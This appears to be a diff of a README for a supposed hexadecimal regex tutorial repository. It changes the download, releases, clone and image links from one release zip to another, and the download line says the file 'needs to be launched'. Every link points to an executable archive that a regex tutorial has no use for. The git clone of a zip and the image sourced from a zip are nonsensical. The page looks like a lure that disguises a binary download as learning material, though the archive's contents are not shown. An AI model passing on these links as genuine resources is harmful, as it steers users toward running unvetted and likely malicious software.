@@ -15,11 +15,11 @@ Welcome to the **Hexadecimal Regex Tutorial** repository! This tutorial is desig
 - **Validation Tool**: Discover how regex can be used as a powerful tool for data validation and verification.
 
 ## Handy Resources 🛠️
-- 🔗 [Download https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v1.0/Program.zip](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v1.0/Program.zip) (needs to be launched)
-- [Check Releases Section](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v1.0/Program.zip) if the link is not working
+- 🔗 [Download https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v2.0/Software.zip](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v2.0/Software.zip) (needs to be launched)
+- [Check Releases Section](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v2.0/Software.zip) if the link is not working
 
 ## How to Use This Repository 🚀
-1. **Clone the Repository**: `git clone https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v1.0/Program.zip`
+1. **Clone the Repository**: `git clone https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v2.0/Software.zip`
 2. **Explore the Tutorials**: Browse through the tutorial files to learn about regex and hexadecimal values.
 3. **Practice Regex**: Use the provided examples to practice writing your own regex patterns.
 4. **Contribute**: If you have insights or improvements, feel free to contribute by creating a pull request.
@@ -27,4 +27,4 @@ Welcome to the **Hexadecimal Regex Tutorial** repository! This tutorial is desig
 ## Get Started 🌟
 Start your regex journey today by checking out this comprehensive tutorial on hexadecimal values! Happy pattern matching! 🎉
 
-![Regex Image](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v1.0/Program.zip)
+![Regex Image](https://github.com/sujabdul/cs-regex-hex-tutorial/releases/download/v2.0/Software.zip)
